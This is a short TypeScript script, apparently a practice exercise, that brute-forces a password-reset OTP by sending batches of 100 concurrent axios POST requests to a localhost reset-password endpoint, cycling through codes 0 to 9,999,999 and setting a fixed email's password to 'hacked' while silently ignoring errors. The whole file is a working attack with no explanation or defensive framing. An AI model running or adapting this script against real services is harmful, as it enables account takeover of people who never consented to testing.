import axios from 'axios';

async function sendRequest(otp:string){
let data = JSON.stringify({
  "email": "dt@mail.com",
  "otp": otp,
  "newPassword": "hacked"
});

let config = {
  method: 'post',
  maxBodyLength: Infinity,
  url: 'http://localhost:3000/reset-password',
  headers: { 
    'Content-Type': 'application/json'
  },
  data : data
};
try{
  await axios.request(config)
}

catch(e) {

}
}

async function batch() {
  for(let i=0;i<=9999999;i+=100){
    console.log(i);
    const p=[]
    for(let j=0;j<100;j++){
      p.push(sendRequest((i+j).toString()))
    }
    await Promise.all(p);
  }
}

batch();

